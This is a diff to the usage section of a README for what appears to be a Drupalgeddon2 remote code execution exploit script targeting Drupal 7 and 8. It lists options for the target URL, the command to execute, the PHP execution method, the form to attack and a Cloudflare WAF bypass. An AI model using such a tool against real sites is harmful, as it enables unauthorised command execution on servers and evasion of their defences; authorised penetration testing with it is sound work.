@@ -179,13 +179,15 @@ proxy_port = 8080
 Usage examples:
 
 ```
-$ ruby drupalgeddon2-customizable-beta.rb https://example.com 7 id passthru 0
-
-1st parameter: Target URL
-2nd parameter: Drupal version (e.g. 7 or 8)
-3rd parameter: Command
-4th parameter: PHP method to use (e.g. passthru, exec, system, assert...)
-5th parameter: 0 for "/?q=user/password", 1 for "/user/password"
+Usage example: ./drupalgeddon-customizable-beta.rb -u http://example.com/ -v 7 -c id
+More info: -h
+    -u, --url URL                    [Required] Service URL
+    -v, --version VERSION            [Required] Target Drupal version {7,8}
+    -c, --command COMMAND            [Required] Command to execute
+    -m, --method PHP_METHOD          [Optional] PHP Method to use, by default: passthru
+        --form                       [Optional] Form to attack, by default '/user/password' in Drupal 7 and '/user/register' in Drupal 8
+        --cloudflare                 [Optional] Tries to bypass Cloudflare using Lua-Nginx +100 parameters WAF Bypass
+    -h, --help                       Prints this help
 ```
 
 
